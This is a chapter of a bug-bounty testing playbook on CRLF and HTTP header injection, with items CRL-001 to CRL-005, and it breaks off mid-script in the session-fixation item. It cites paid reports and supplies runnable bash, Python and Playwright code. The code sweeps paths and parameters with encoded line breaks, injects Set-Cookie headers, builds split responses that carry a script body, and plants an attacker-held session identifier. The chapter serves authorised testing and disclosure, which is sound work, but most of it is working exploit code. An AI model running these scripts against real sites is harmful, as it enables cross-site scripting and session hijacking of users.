# CRL · CRLF & header injection

> A carriage return and line feed in our input end one line of a line-based message the server builds, and what
> follows becomes a line we wrote: a response header, a second response, a header of the server's own outgoing
> request, a mail header or an SMTP command. An extra header line on its own is low. It pays when the line does
> something: sets a cookie that fixes the victim's session, starts a body that runs script, adds a recipient to
> the organisation's mail, or reaches a service behind the server.

| | |
|---|---|
| **Class** | `crlf` |
| **Applies when** | http |
| **Pays** | 148 disclosed reports filed under the class and 39 more that touch it; 24 paid, median $450, top $5,000. The two best-paid reached mail: an SMTP server setting that led to command execution (#1200647, $5,000) and an e-mail address field that accepted `%0d%0a` (#815085, $3,750). The best-paid response split set cookies for the parent domain through redirects (#197279, $2,500). Six of the 24 were paid by the Internet Bug Bounty and GitHub Security Lab, for library and server bugs and one query submission (#2585373, $2,600). |
| **Weaknesses** | CRLF Injection · CWE-93 · HTTP Response Splitting · CWE-113 · Cross-site Scripting (XSS) - Reflected · CWE-79 · Session Fixation · CWE-384 · HTTP Request Smuggling · CWE-444 |

## Why it pays

HTTP/1.1 headers, the request a server sends to a webhook, mail headers and SMTP commands are line protocols: CR
LF ends a field and an empty line ends the header block. Any place that writes our input into one of them without
refusing CR and LF lets us add lines. Application frameworks now refuse or neutralise line breaks in response
headers (PHP's `header()`, Django, Flask, Node and Go do), so the class lives in the layers around the
application: web-server and proxy configuration that copies the decoded path into a redirect (#25275 and #15492
are titled as insecure nginx configurations), appliances and legacy hosts (four reports in the class are on VPN
portal hosts: #237357, #231508, #234758, #232327), servers that keep only the low byte of a Unicode character,
back ends behind Apache httpd before 2.4.59 (#2585373), mail code that builds headers by concatenation, and HTTP/2
front ends that write a header value into the HTTP/1.1 request they send upstream.

Standalone the class is cheap. Of the 148 reports filed under it, 114 carry no severity rating, 13 are rated low,
16 medium, 2 high and 3 critical. Leaving out the 55 on library programmes (curl alone has 33) and the 10 titles
about the Host header, 61 reports describe a CRLF injection or response splitting on a deployed web host; nine
were paid, median $200, and the best-paid of them set cookies for the parent domain (#197279, $2,500). The two
best-paid reports in the class put the line break into mail instead: an SMTP server setting that reached command
execution (#1200647, $5,000) and an e-mail address field that accepted it (#815085, $3,750); #347439 ($500) is
titled as SMTP header injection that sent arbitrary mail. A header line with no consequence is Low at best, and
the triager's first question is what it does.

The chapter has three parts. CRL-001 to CRL-003 find a split in the target's own responses: through the path, a
redirect parameter, or any other parameter that lands in a header. CRL-004 and CRL-005 turn a split into script in
the origin or a fixed session. CRL-006 to CRL-008 look for the line break in messages the server sends onward: its
outgoing HTTP requests, its mail, and the upstream request an HTTP/2 front end writes.

## The crux question

**Where does the server write my input into a line-based message (a response header, its own outgoing request, a
mail header or SMTP command, the HTTP/1.1 request a front end sends upstream), and does a line break in my input
survive into it as a line break?**

## Applicability probe

The chapter gate (`http`) comes from the fingerprint. The items are gated by facts other probes settle:
`redirect-param` and `params` (fingerprint, RDR probe), `url-fetch` (SSR probe), `cookie-auth` (AUT probe),
`http2` and `reverse-proxy` (fingerprint). This chapter settles `email-out`, and records which component writes
the redirects, which CRL-001 needs.

```bash
W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
# 1. which component writes redirects and errors: compare Server and Via on the plain-HTTP redirect, a missing path and a malformed one
for u in "http://$H/" "https://$H/crlprobe" "https://$H/%2e%2e%2fcrlprobe"; do
  echo "== $u"; curl -sS --path-as-is "${HDR[@]}" -o /dev/null -D- --max-time 10 "$u" | grep -aiE '^(HTTP/|server:|via:|location:|x-cache|cf-ray|x-amz-cf)'; sleep "$W"; done
# 2. an HTTP/2 front end
curl -sS "${HDR[@]}" --http2 -o /dev/null -w 'http_version=%{http_version}\n' "https://$H/"
# 3. features that send mail built from our input, named in the crawl and the bundles
grep -rhoiE '/[a-z0-9_/-]*(contact|invite|share|refer|feedback|support|ticket|newsletter|subscribe|appointment|tell-?a-?friend|send-?to)[a-z0-9_/-]*' \
  "$E/recon/$H/" 2>/dev/null | sort | uniq -c | sort -rn | head -20
```

While walking the application, note every form that makes the server send mail built from what we type: contact
and support forms (with or without a "send me a copy" box), team and project invitations, share by e-mail, referral
invitations, newsletter sign-up, appointment and calendar invitations, and the profile fields (display name,
organisation) that appear in mail the application sends.

```bash
scripts/sane fact set "$H" email-out=1 --ev "POST /team/invite mails the invitee with the inviter's display name; /contact mails support and offers a copy to the sender"
scripts/sane fact set "$H" http2=1 reverse-proxy=1 --ev "curl --http2 gives http_version=2; Server: cloudflare on the redirect, Server: nginx on the origin's 404"
# nothing sends mail after an authenticated walk:
scripts/sane fact set "$H" email-out=0 --ev "no contact, invite, share, referral or notification feature sends mail built from input"
# nothing speaks HTTP:
scripts/sane fact set "$H" http=0 --ev "no HTTP answer on 80, 443 or any web port from the port scan (sane fp, $(date -u +%F))"
```

With `http=0` the chapter closes for the asset and the planner writes the reason. CRL-001 needs no parameter and
stays queued for every host name that answers HTTP; the other items close on their own facts.

## Triage order

CRL-001 (per host name, a few requests, no parameter needed) → CRL-002 (the redirect parameters, three requests
each) → CRL-003 (a marker sweep, then line breaks where a header echoes the marker) → CRL-004 and CRL-005 as soon
as any split holds (a body for script, a cookie for the session) → CRL-008 (seven HTTP/2 requests per host name;
the ceiling is the SMG chapter's) → CRL-007 (mail forms, a minute per submission) → CRL-006 (fetchers, with a raw
listener on our host).

## Items

### CRL-001 · A `%0d%0a` in the request path comes back as a separate header line in a redirect that the web server or proxy builds from the decoded path

| | |
|---|---|
| **Severity** | Low standalone (a header line of our choosing in the target's response); Medium with CRL-004 (script in the origin); High with CRL-005 when the planted cookie fixes a session |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | HTTP Response Splitting · CWE-113 |
| **Prior art** | #197279, #66386, #25275, #409512 |

- **Where:** no asset fact gates this item beyond `http`: any host name can answer with a redirect built from the
  path, and the path needs no parameter. The writers are configured per host name: the plain-HTTP to HTTPS
  redirect on port 80, `www` and canonical-host redirects, catch-all and trailing-slash rules, locale prefixes, and
  module redirects (Apache `mod_userdir`, #409512). Then the application's own path redirects: a sign-in-only page
  that sends the browser to `/login?next=<path>`. Secondary and legacy hosts are where the class is still found:
  VPN and SSO portals, regional sites, static hosts behind a CDN.
- **Test:** the writer copies the decoded path into `Location` or another header. In nginx, `$uri`,
  `$document_uri` and the captures of a `location ~` regex hold the path after percent-decoding, so
  `return 301 https://$host$uri;` or an `add_header` that uses them turns `%0d%0a` into a real line break;
  `$request_uri` holds the raw path and is safe. Send a path that ends in a line break and a harmless header, and
  look for that header at the start of a response line. Where our text comes back inside a header without a new
  line, try the encodings a filter or a decoder treats differently.
- **How:** one request per scheme and path first; the encodings only where step 1 shows our text inside a header.
  ```bash
  D="$E/evidence/$H/CRL-001"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  X='X-Crl001:%20probe'                       # the line we try to add: harmless and easy to find
  R=( / )                                     # add a sign-in-only path from the crawl: R=( / /account )
  ENCS=( '%0a' '%0d' '%3f%0d%0a' '%E5%98%8A' '%E5%98%8D%E5%98%8A' '%E5%98%8A%E5%98%8D' '%C4%8D%C4%8A' '%250d%250a' )
  probe(){  # probe <url with @@> <line break as sent>  ->  status, verdict, line break, template, url
    local u="${1//@@/$2$X}" f c v=-; f="$D/$(printf %s "$u" | md5sum | cut -c1-10).hdr"; : > "$f"
    c=$(curl -sS --path-as-is "${HDR[@]}" -o /dev/null -D "$f" -w '%{http_code}' --max-time 10 "$u")
    grep -aiq 'crl001' "$f" && v=REFLECTED; grep -aiqP '(^|\r)x-crl001: ?probe' "$f" && v=SPLIT
    printf '%s\t%s\t%s\t%s\t%s\n' "$c" "$v" "$2" "$1" "$u"; sleep "$W"; }
  # 1. the plain line break on both schemes and every path
  for b in "http://$H" "https://$H"; do for r in "${R[@]}"; do probe "$b${r%/}/crl001@@" '%0d%0a'; done; done | tee "$D/plain.tsv"
  # 2. the encodings, where step 1 found our text in a header without a new line
  awk -F'\t' '$2=="REFLECTED"{print $4}' "$D/plain.tsv" | sort -u | while read -r t; do
    for e in "${ENCS[@]}"; do probe "$t" "$e"; done; done | tee "$D/encoded.tsv"
  awk -F'\t' '$2=="SPLIT"' "$D/plain.tsv" "$D/encoded.tsv" | tee "$D/hits.tsv"
  ```
  The `(^|\r)` test catches a line started by LF and one started by a bare CR; a line break that stayed encoded
  (`%0D%0A`) or became a space matches neither. `%E5%98%8A` is U+560A and `%C4%8A` is U+010A, whose low byte is LF
  (`%E5%98%8D` and `%C4%8D`: CR): they split only where the server writes header strings by keeping the low byte of
  each character. `%3f%0d%0a` puts an encoded `?` before the line break: the server's parser keeps it all in the
  path, and a later component that splits the decoded path at `?` treats the line break as part of a query it does
  not escape (#490997 is titled as a CRLF injection with an encoded query mark). `%250d%250a` splits where the path
  is decoded twice.
- **Proof:** the raw response, saved with `curl -sS -D- --path-as-is -o /dev/null '<the hit url>' > "$D/proof.txt"`,
  showing `X-Crl001: probe` as a header line of its own; the same path without the line break as the control; the
  `Server` header naming the writer. Then the same link with `Set-Cookie:%20crl001=probe%3B%20Path=/` in place of
  the test header (`%3B`: servers that read a literal `;` as a path-parameter delimiter, Tomcat among them, strip
  it), opened in Chrome or Firefox, with
  `crl001=probe` in the browser's cookie storage (DevTools, or Playwright's `context.cookies()`): triagers accept a
  split they can see in a browser, not one only curl shows.
- **Not a finding when:** our text sits inside `Location` with the line break still encoded or replaced by a
  space: the writer escaped it. The split needs a bare CR or a folded line (CR LF followed by a space or tab) and
  the browser check in Proof stores no cookie: RFC 9112 makes a bare CR invalid and lets a recipient read it as a
  space, and a folded line continues the previous header (#145392 is titled as needing PHP header folding and
  Internet Explorer 11). The split is only on
  the port-80 redirect: current Chrome upgrades `http://` navigations to `https://` before sending them when the
  host answers HTTPS, and an HSTS-preloaded domain never sends them, so show the link working in a browser before
  claiming impact. The front end answers 502 to the split: it refused the origin's malformed response and no
  browser sees it. A 400 page that echoes the raw request line prints it in the body, not in a header. The host
  runs on a vendor's infrastructure (a hosted VPN or support portal): `third-party`, or the CVE chapter when it is a
  known appliance bug.
- **Escalate:** CRL-004 when the split response is one a browser renders; CRL-005 for any split, redirect or not.
  One configuration usually serves several host names: run the item on each and report them together as one root
  cause. A decoded path copied into `proxy_set_header` or `proxy_pass` puts the line break into the request the
  proxy sends upstream: the SMG chapter's ground, tested only with a harmless header. A cacheable split response is
  served to every visitor: CCH chapter.

### CRL-002 · A line break in a redirect parameter is written into the `Location` header and starts a header line of our choosing

| | |
|---|---|
| **Severity** | Low standalone (a header line of our choosing in a link anyone can be sent); Medium with CRL-004 (script, often through an empty `Location`); High with CRL-005 when the planted cookie fixes a session |
| **Requires** | redirect-param |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | HTTP Response Splitting · CWE-113 |
| **Prior art** | #2147132, #811366, #181939, #2012519 |

- **Where:** the parameters whose value decides the next location (`next`, `redirect`, `redirect_uri`,
  `return_to`, `returnUrl`, `continue`, `dest`, `goto`, `url`, `r`, `u`, `back_url`, `success_url`, `cancel_url`,
  `service`) on sign-in and sign-out, language and currency switchers, outbound-link wrappers, unsubscribe pages,
  payment returns and OAuth authorization requests (#2147132 is titled as a CRLF through `redirect_uri`). The RDR
  chapter's redirect inventory (`$E/evidence/$H/RDR-001/results.tsv`) lists them when it exists; the How adds the
  crawl and the usual sign-in and sign-out routes.
- **Test:** the application decodes the parameter once, which turns `%0d%0a` into a real CR LF in the value,
  validates it, and copies it into `Location`. Validators look at the start of the value (a leading `/`, the
  application's own host), so put the line break after a prefix that passes: a relative path, an absolute URL on
  the asset's own host, and nothing at all. The empty prefix leaves `Location` empty, which Chrome does not follow
  (CRL-004 uses that).
- **How:** three templates per parameter, ten parameters at most; the encodings only where the plain form came
  back without a new line.
  ```bash
  D="$E/evidence/$H/CRL-002"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  X='X-Crl002:%20probe'; S=()                 # S=($A) for redirects that only answer inside a session
  ENCS=( '%0a' '%0d' '%E5%98%8A' '%E5%98%8D%E5%98%8A' '%E5%98%8A%E5%98%8D' '%C4%8D%C4%8A' '%250d%250a' )
  cat > "$D/cands.py" <<'PY'
  # URLs on stdin -> "<template>\t<parameter>": a relative path, the own host and an empty value, each followed by @@
  import re, sys, urllib.parse as up
  N = re.compile(r"^(next|url|uri|redir(ect)?(_?(ur[il]|to))?|return(_?(to|url|path))?|returnurl|continue|dest(ination)?|go(to)?"
                 r"|target|to|out|back(_?url)?|callback(_?url)?|success_url|cancel_url|service|r|u)$", re.I)
  seen = set()
  for line in sys.stdin:
      s = up.urlsplit(line.strip()); qs = up.parse_qsl(s.query, keep_blank_values=True)
      for k, _ in qs:
          if not N.match(k) or (s.path, k) in seen or len(seen) >= 10:
              continue
          seen.add((s.path, k))
          for v in ("/crl002QQSENTQQ", f"https://{s.hostname}/crl002QQSENTQQ", "QQSENTQQ"):
              q = up.urlencode([(a, v if a == k else b) for a, b in qs])
              print(up.urlunsplit(s._replace(query=q)).replace("QQSENTQQ", "@@") + "\t" + k)
  PY
  { grep -rhoE "https?://$H[^\"' <>]*\?[^\"' <>]+" "$E/recon/$H/" 2>/dev/null
    cut -f4 "$E/evidence/$H/RDR-001/results.tsv" 2>/dev/null
    printf '%s\n' "$T/login?next=/" "$T/logout?redirect=/" "$T/signin?return_to=/"; } | sort -u | python3 "$D/cands.py" > "$D/templates.tsv"
  probe(){  # probe <url with @@> <line break as sent>  ->  status, verdict, line break, template, url
    local u="${1//@@/$2$X}" f c v=-; f="$D/$(printf %s "$u" | md5sum | cut -c1-10).hdr"; : > "$f"
    c=$(curl -sS "${HDR[@]}" "${S[@]}" -o /dev/null -D "$f" -w '%{http_code}' --max-time 10 "$u")
    grep -aiq 'crl002' "$f" && v=REFLECTED; grep -aiqP '(^|\r)x-crl002: ?probe' "$f" && v=SPLIT
    printf '%s\t%s\t%s\t%s\t%s\n' "$c" "$v" "$2" "$1" "$u"; sleep "$W"; }
  cut -f1 "$D/templates.tsv" | while read -r t; do probe "$t" '%0d%0a'; done | tee "$D/plain.tsv"
  awk -F'\t' '$2=="REFLECTED"{print $4}' "$D/plain.tsv" | sort -u | while read -r t; do
    for e in "${ENCS[@]}"; do probe "$t" "$e"; done; done | tee "$D/encoded.tsv"
  awk -F'\t' '$2=="SPLIT"' "$D/plain.tsv" "$D/encoded.tsv" | tee "$D/hits.tsv"
  ```
  `%E5%98%8A` (U+560A) and `%C4%8A` (U+010A) end a line only where the server writes header strings by keeping
  the low byte of each character (`%E5%98%8D` and `%C4%8D` give CR the same way); `%250d%250a` ends one only
  where the value is decoded twice. The `(^|\r)` test catches a line started by LF or by a bare CR.
- **Proof:** the link (one GET anyone can be sent), the raw response with `X-Crl002: probe` on its own line, the
  same link with `%250d%250a` as the control, and the framework or server that wrote it (`Server`,
  `X-Powered-By`). In a browser: the same link with `Set-Cookie:%20crl002=probe%3B%20Path=/` in place of the test
  header (`%3B`, because some query parsers split parameters at a literal `;`), and the cookie present in the
  browser's storage afterwards. Report it as header injection with what the injected line does (CRL-004,
  CRL-005), not as a redirect: the policy's `open-redirect` exclusion does not cover a split.
- **Not a finding when:** the line-break variant answers 500 (Django, Flask and Node throw) or comes back with no
  `Location` (PHP's `header()` drops the line with a warning) while the control redirects: the framework refused
  the header, which is the control holding. The line break comes back encoded, or as a space (Go). The value is
  read only from a JSON body or a custom header: no victim's browser sends it cross-site, so the split is
  self-only unless a shared cache stores the response (CCH chapter). The only split needs a bare CR and the
  browser check stores no cookie.
- **Escalate:** the empty template is the shortest path to CRL-004: Chrome renders the body of a redirect whose
  `Location` is empty. CRL-005 for the cookie. A value the allow-list refuses outright is RDR-002's work first; a
  bypass that reaches `Location` then takes the line break added here. A split on an OAuth authorization server
  plants cookies on the identity provider's domain: read it with the OAU chapter's lens.

### CRL-003 · A parameter that the application copies into a response header other than `Location` keeps its line break and starts a header line of our choosing

| | |
|---|---|
| **Severity** | Low standalone; Medium with CRL-004 (download, cookie and refresh responses are usually 200s, which a browser renders); High with CRL-005 when the planted cookie fixes a session |
| **Requires** | params |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | HTTP Response Splitting · CWE-113 |
| **Prior art** | #446271, #2189960, #858650, #1514359 |

- **Where:** parameters the application stores in a cookie (`lang`, `locale`, `currency`, `region`, `theme`, `ref`,
  `aff`, `utm_*`, `campaign`, `coupon`, a remembered filter or tab: #446271's summary shows a landing-page parameter
  `t` carrying a `Set-Cookie`), parameters that name a download (`filename`, `name`, `download`, `title` on export,
  invoice and attachment endpoints: #2189960's summary names a `file_name` parameter), and parameters echoed in
  `Link`, `Refresh`, `Content-Language`, `Content-Type` (`format=`, `callback=`) or a custom `X-` header. Include
  JSON and form bodies whose values the server writes into headers (an export call whose `fileName` becomes
  `Content-Disposition`).
- **Test:** first find which parameter values appear in which response header, with a unique marker per
  parameter; then send the line break only to those. In a JSON body the line break is a JSON escape (`\r\n`,
  `\u000d\u000a`) that the parser decodes: URL-decoding filters and WAF rules on `%0d%0a` never see it.
- **How:** up to 300 (path, parameter) pairs from the crawl in step 1, then a few requests per reflecting pair.
  ```bash
  D="$E/evidence/$H/CRL-003"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  X='X-Crl003:%20probe'
  ENCS=( '%0a' '%0d' '%E5%98%8A' '%E5%98%8D%E5%98%8A' '%E5%98%8A%E5%98%8D' '%C4%8D%C4%8A' '%250d%250a' )
  cat > "$D/marks.py" <<'PY'
  # URLs on stdin -> marker, parameter, the URL with the marker as that parameter's value, the same URL with crl003@@
  import sys, urllib.parse as up
  seen = set()
  for line in sys.stdin:
      s = up.urlsplit(line.strip()); qs = up.parse_qsl(s.query, keep_blank_values=True)
      for k, _ in qs:
          if (s.path, k) in seen or len(seen) >= 300:
              continue
          seen.add((s.path, k)); m = f"crl003m{len(seen)}z"
          url = lambda v: up.urlunsplit(s._replace(query=up.urlencode([(a, v if a == k else b) for a, b in qs])))
          print(m, k, url(m), url("crl003QQSENTQQ").replace("QQSENTQQ", "@@"), sep="\t")
  PY
  grep -rhoE "https?://$H[^\"' <>]*\?[^\"' <>]+" "$E/recon/$H/" 2>/dev/null | sort -u | python3 "$D/marks.py" > "$D/marks.tsv"
  # 1. which parameters come back in a response header other than Location (CRL-002 covers Location)
  while IFS=$'\t' read -r m k u t; do
    h=$(curl -sS "${HDR[@]}" -o /dev/null -D- --max-time 10 "$u" | tr -d '\r' | grep -ai "$m" | grep -vi '^location:' | head -1)
    [ -n "$h" ] && printf '%s\t%s\t%s\n' "$k" "${h%%:*}" "$t"; sleep "$W"
  done < "$D/marks.tsv" | tee "$D/reflected.tsv"
  # 2. the line break where a header echoed the marker, the encodings where it came back without a new line
  probe(){  # probe <url with @@> <line break as sent>  ->  status, verdict, line break, template, url
    local u="${1//@@/$2$X}" f c v=-; f="$D/$(printf %s "$u" | md5sum | cut -c1-10).hdr"; : > "$f"
    c=$(curl -sS "${HDR[@]}" -o /dev/null -D "$f" -w '%{http_code}' --max-time 10 "$u")
    grep -aiq 'crl003' "$f" && v=REFLECTED; grep -aiqP '(^|\r)x-crl003: ?probe' "$f" && v=SPLIT
    printf '%s\t%s\t%s\t%s\t%s\n' "$c" "$v" "$2" "$1" "$u"; sleep "$W"; }
  cut -f3 "$D/reflected.tsv" | sort -u | while read -r t; do probe "$t" '%0d%0a'; done | tee "$D/plain.tsv"
  awk -F'\t' '$2=="REFLECTED"{print $4}' "$D/plain.tsv" | sort -u | while read -r t; do
    for e in "${ENCS[@]}"; do probe "$t" "$e"; done; done | tee "$D/encoded.tsv"
  awk -F'\t' '$2=="SPLIT"' "$D/plain.tsv" "$D/encoded.tsv" | tee "$D/hits.tsv"
  # 3. a JSON body whose value becomes a header: the real request from the proxy history (this export call is an example);
  #    when the file is served by a later download request, read that request's headers
  curl -sS "${HDR[@]}" $A -D- -o /dev/null -X POST "$T/api/exports" -H 'Content-Type: application/json' \
    -d '{"format":"csv","fileName":"crl003\r\nX-Crl003: probe"}' | grep -aiP '(^|\r)x-crl003: ?probe|^content-disposition'
  # 4. a form body whose value becomes a header (a form another site can submit): the real form's action and field
  curl -sS "${HDR[@]}" $A -D- -o /dev/null -X POST "$T/export" --data-urlencode $'fileName=crl003\r\nX-Crl003: probe' \
    | grep -aiP '(^|\r)x-crl003: ?probe|^content-disposition'
  ```
  `%E5%98%8A` (U+560A) and `%C4%8A` (U+010A) end a line only where the server keeps the low byte of each character
  (`%E5%98%8D` and `%C4%8D` give CR); `%250d%250a` only where the value is decoded twice. The `(^|\r)` test catches
  a line started by LF or by a bare CR.
- **Proof:** the request (a link, or a form another site can submit), the raw response with `X-Crl003: probe` as
  its own line, and the control with `%250d%250a`. For a `Set-Cookie` reflection, the same link adding
  `Set-Cookie:%20crl003=probe%3B%20Path=/` (`%3B`, because some query parsers split parameters at a literal `;`),
  and the cookie present in the browser afterwards. For a stored value, the GET that serves it (the download
  link) with the injected line, opened by a second session.
- **Not a finding when:** the only carrier is a request header (`X-Request-Id`, `X-Forwarded-Host`, `Origin`,
  `User-Agent`, a cookie): a victim's browser cannot be made to send it, so the split is self-only (#798686 is
  titled as an echoed `x-request-id`) unless a shared cache stores the response, which is the CCH chapter's finding.
  `Content-Disposition` carries the name as `filename*=UTF-8''crl003%0D%0A...`: RFC 5987 encoding, not a line
  break. The split is in the response to a JSON POST: a browser sends that body cross-site only after a CORS
  preflight, so it is self-only unless the stored value comes back in the headers of a GET that another user
  opens. The endpoint needs a bearer token the browser does not attach on its own: self-only. A `;` that survives
  in a `Set-Cookie` value adds attributes (`Domain=`, `Path=`, `Max-Age=`) to that one cookie and no new header
  (#806577 is titled as that case): Low, and only where the attribute matters.
- **Escalate:** CRL-004: these responses are usually 200s, so a body after an empty line renders without the
  redirect problem. Do not repeat `Content-Disposition` or `Content-Length` in that payload: Chrome refuses a
  response that carries two different values (`ERR_RESPONSE_HEADERS_MULTIPLE_CONTENT_DISPOSITION`,
  `..._CONTENT_LENGTH`). CRL-005 for the cookie. CCH chapter for a request-header carrier on a cacheable response.

### CRL-004 · A split response renders a body we wrote, and script runs in the target's origin from one link

| | |
|---|---|
| **Severity** | Medium standalone (script in the origin from one link); Low on a host that holds no session and no user data; High with XSS-018 (an account action in the victim's session) |
| **Requires** | browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Reflected · CWE-79 |
| **Prior art** | #191380, #192749, #335599, #384872 |

- **Where:** each split recorded by CRL-001 to CRL-003 on this host (`$E/evidence/$H/CRL-00[123]/hits.tsv`: the
  line break that worked and a template with `@@` where it goes), or a split found by hand, written as a template
  the same way. CRL-001 runs on every host name, so a split it recorded on another name of this deployment is added
  to `HITS` in the How. With no split recorded there is nothing to work on: mark the item `skipped` with "no split
  from CRL-001 to CRL-003".
- **Test:** an empty line ends the header block, so a second line break starts a body the browser parses. The
  browser renders it only when it does not follow the response as a redirect, so read the saved headers first.
  (a) A 200, 4xx or 5xx response, or our line written before `Location`: the body works, because every header after
  the injection point falls into the body, `Location` included. (b) A redirect whose `Location` we start (CRL-002's
  empty template): Chrome treats a 30x with an empty `Location` as an ordinary response and renders it. (c) A
  redirect with a fixed prefix in `Location` and our line after it: the browser follows it and never renders the
  body; go to CRL-005. Match the framing: a `Transfer-Encoding: chunked` before the injection point needs a chunked
  body, a `Content-Length` before it must be at least as long as the payload, and a `Content-Security-Policy` before
  it still applies (one after it falls into the body and no longer does).
- **How:** the first hit is taken by default; pick a row of case (a) or (b) when there is one.
  ```bash
  D="$E/evidence/$H/CRL-004"; mkdir -p "$D"
  HITS=( "$E/evidence/$H"/CRL-00[123]/hits.tsv )   # add "$E/evidence/<another name of this deployment>/CRL-001/hits.tsv"
  cat "${HITS[@]}" 2>/dev/null | cut -f2- | sort -u | head   # verdict, line break, template, url
  IFS=$'\t' read -r _ _ L TPL _ < <(cat "${HITS[@]}" 2>/dev/null | head -1)
  echo "line break: $L   template: $TPL"
  B='%3Csvg%20onload%3Dalert(document.domain)%3E'   # <svg onload=alert(document.domain)>: 35 bytes, 0x23
  CT="Content-Type:%20text/html$L"
  printf 'body\t%s\nchunked\t%s\n' "${TPL//@@/$L$CT$L$B}" "${TPL//@@/$L$CT${L}23$L$B${L}0$L$L}" > "$D/links.tsv"
  curl -sS "${HDR[@]}" -D- -o "$D/body.bin" "$(head -1 "$D/links.tsv" | cut -f2)" | head -30; head -c 300 "$D/body.bin"
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <links.tsv> <evidence dir> <the HDR arguments>: opens each link in Chromium and, when installed, Firefox
  const pw = require('playwright'), fs = require('fs');
  (async () => {
    const [list, dir, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const log = s => fs.appendFileSync(`${dir}/dialog.txt`, s + '\n');
    for (const eng of ['chromium', 'firefox']) {
      let b; try { b = await pw[eng].launch(); } catch (e) { log(`${eng}: not installed`); continue; }
      const c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd });
      for (const [name, url] of fs.readFileSync(list, 'utf8').trim().split('\n').map(l => l.split('\t'))) {
        const p = await c.newPage();
        p.on('dialog', async d => { log(`${eng} ${name} ${p.url()} -> ${d.message()}`); await d.accept(); });
        await p.goto(url, { timeout: 15000 }).catch(e => log(`${eng} ${name} ${e.message.split('\n')[0]}`));
        await p.waitForTimeout(2000); await p.screenshot({ path: `${dir}/${eng}-${name}.png` }); await p.close();
      }
      await b.close();
    }
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$D/links.tsv" "$D" "${HDR[@]}"; cat "$D/dialog.txt"
  ```
  `npx --yes playwright install firefox` adds the second engine. Where the split needed a low-byte character, a
  filter that strips `<` and `>` is passed the same way: `%E5%98%BC` and `%E5%98%BE` end in `<` and `>`.
- **Proof:** `dialog.txt` showing the target host as `document.domain` from the split link in Chromium (and Firefox
  where installed), the screenshot, and the raw response (`curl -sS -D- '<link>'`) with our body after the empty
  line. One link, no other interaction.
- **Not a finding when:** the screenshot shows the page `Location` pointed to: the browser followed the redirect
  (case c). The payload shows as text: a non-HTML `Content-Type` applies and `X-Content-Type-Options: nosniff`
  stops sniffing; the Fetch standard takes the last valid `Content-Type`, so the one we add normally wins, but
  confirm it in the browser. No dialog and a CSP violation in the console: the policy came before the injection
  point (XSS-015 for an allowed script source). `ERR_RESPONSE_HEADERS_MULTIPLE_CONTENT_LENGTH`, `..._LOCATION` or
  `..._CONTENT_DISPOSITION`: the payload repeated a header the server also sends with another value. The server's
  `Content-Length` came before the injection point and is shorter than the payload, or 0: the browser reads only
  that many bytes. It works only in an obsolete browser: #197279's summary records Internet Explorer, and triagers
  reproduce in current Chrome and Firefox.
- **Escalate:** XSS-018: the account action that makes it High (read the anti-CSRF token, change the e-mail of our
  own account B). On a sibling sub-domain the same script writes cookies for the parent domain (XSS-016, CSR-011).
  A cacheable split response keeps the script for every visitor: CCH chapter.

### CRL-005 · A `Set-Cookie` injected through a split plants the session identifier in the victim's browser, and the victim's sign-in authenticates the session we hold

| | |
|---|---|
| **Severity** | Low standalone (a cookie of our choosing stored for the site, shown in the browser); High when the planted identifier is the session the victim signs in to; Medium when it plants the cookie of a double-submit CSRF check (CSR-004) |
| **Requires** | cookie-auth, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Session Fixation · CWE-384 |
| **Prior art** | #197279, #97292, #811366, #266030 |

- **Where:** a split from CRL-001 to CRL-003 (`$E/evidence/<host>/CRL-00[123]/hits.tsv`) on the application's host
  or on any host whose cookies reach it: the parent domain and its other sub-domains, because a sibling can set a
  cookie for the parent domain. A sibling's split is used from this card, and its planting link is the only
  request sent to that host. Read the session cookie's name and attributes from the sign-in response: `Domain`,
  `Path`, `Secure`, `HttpOnly`, a `__Host-` or `__Secure-` prefix. With no split recorded, mark the item `skipped`
  with "no split from CRL-001 to CRL-003".
- **Test:** browsers store a `Set-Cookie` from any response, redirects included, so this works on every split. Plant
  an identifier the attacker holds, let our victim account B sign in in that browser, and see whether the attacker's
  copy is now signed in as B. It holds only when the application keeps the identifier across sign-in (or adopts one
  it never issued); when it rotates the identifier, the planted cookie is just a cookie.
- **How:** `SC` is the session cookie's name and `PARENT` the domain the planted cookie is set for (the real
  cookie's `Domain`, or else the application host's registrable domain); `APP` is the application's base URL;
  `B_USER` and `B_PASS` are account B's credentials in the environment, never written to evidence.
  ```bash
  D="$E/evidence/$H/CRL-005"; mkdir -p "$D"; : "${SC:?name of the session cookie}" "${PARENT:?the cookie's Domain or the registrable domain}"
  APP="$T"                                   # the application whose session is planted, when this card runs on a sibling's split
  # the split: this host first, then the parent domain and its sub-domains (their cookies reach the application)
  HITS=( "$E/evidence/$H"/CRL-00[123]/hits.tsv "$E/evidence/$PARENT"/CRL-00[123]/hits.tsv "$E/evidence/"*".$PARENT"/CRL-00[123]/hits.tsv )
  IFS=$'\t' read -r _ _ L TPL _ < <(cat "${HITS[@]}" 2>/dev/null | head -1); echo "split: $TPL ($L)"
  # 1. a session identifier issued before sign-in: the attacker's copy, percent-encoded once because the server decodes our value
  V=$(curl -sS "${HDR[@]}" -c - -o /dev/null "$APP/login" | awk -v n="$SC" '$6==n{v=$7} END{print v}'); echo "V=$V" | tee "$D/attacker.txt"
  VE=$(python3 -c 'import sys, urllib.parse as u; print(u.quote(sys.argv[1], safe=""))' "$V")
